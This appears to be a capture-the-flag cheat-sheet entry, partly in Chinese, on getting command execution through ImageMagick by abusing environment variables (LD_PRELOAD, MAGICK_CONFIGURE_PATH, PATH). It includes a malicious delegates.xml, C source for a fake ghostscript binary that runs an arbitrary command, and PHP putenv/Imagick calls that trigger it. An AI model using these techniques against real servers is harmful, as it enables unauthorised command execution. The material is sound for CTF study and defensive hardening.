---
title: "Command Injection"
description: "
ImageMagick





LD_PRELOAD + ghostscript:

Imagemagick 會用 ghostscript去parse eps
Link



LD_PRELOAD + ffpmeg

Link



MAGICK_CODER_MODULE_PATH



it can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory


Document
Link



MAGICK_CONFIGURE_PATH

delegates.xml 定義處理各種文件的規則
可以用 putenv 寫掉設定檔路徑
Link

<delegatemap>
<delegate decode=\"ps:alpha\" command=\"sh -c &quot;/readflag > /tmp/output&quot;\"/>
</delegatemap>


蓋PATH + ghostscript:

造一個執行檔 gs

#include <stdlib.h>
#include <string.h>
int main() {
    unsetenv(\"PATH\");
    const char* cmd = getenv(\"CMD\");
    system(cmd);
    return 0;
}
putenv('PATH=/tmp/mydir');
putenv('CMD=/readflag > /tmp/mydir/output');
chmod('/tmp/mydir/gs','0777');
$img = new Imagick('/tmp/mydir/1.ept');


"
external_category: "Miscellaneous"
---[Visit Website](https://www.exploit-db.com/exploits/39766)

